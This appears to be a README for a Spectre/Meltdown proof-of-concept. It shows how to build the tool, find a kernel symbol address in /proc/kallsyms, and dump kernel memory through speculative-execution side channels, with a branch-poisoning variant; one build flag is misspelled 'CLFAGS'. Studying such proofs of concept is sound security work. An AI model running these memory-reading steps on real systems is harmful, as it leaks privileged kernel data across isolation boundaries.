Spectre and Meltdown Proof-of-Concept
=====================================

Read kernel addresses by stalling the pipeline and speculatively hitting a cacheline:

```
$ make
cc -o poc poc.c -O0 -lm 
$ grep init_top_pgt /proc/kallsyms 
ffffffffa2c09000 D init_top_pgt
$ ./poc ffffffffa2c09870  # skip some because it's mostly zeros
0xffffffffa2c09870 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0xffffffffa2c09880 | 67 20 21 b3 03 00 00 00 00 00 00 00 00 00 00 00 
0xffffffffa2c09890 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
0xffffffffa2c098a0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
...
```

Read kernel addresses by poisoning the branch predictor and speculatively hitting a cacheline:
```
make CLFAGS=-DPOISON
$ ./poc 0xffffffffa2c09880
0xffffffffa2c09880 | 67 20 21 b3 03 00 00 00 00 00 00 00 00 00 00 00 
...
```

Visualize memory read timings:
```
$ make CFLAGS=-DVISUALIZE
cc -o poc poc.c -DVISUALIZE -lm 
$ ./poc 0xffffffffa2c09883
```
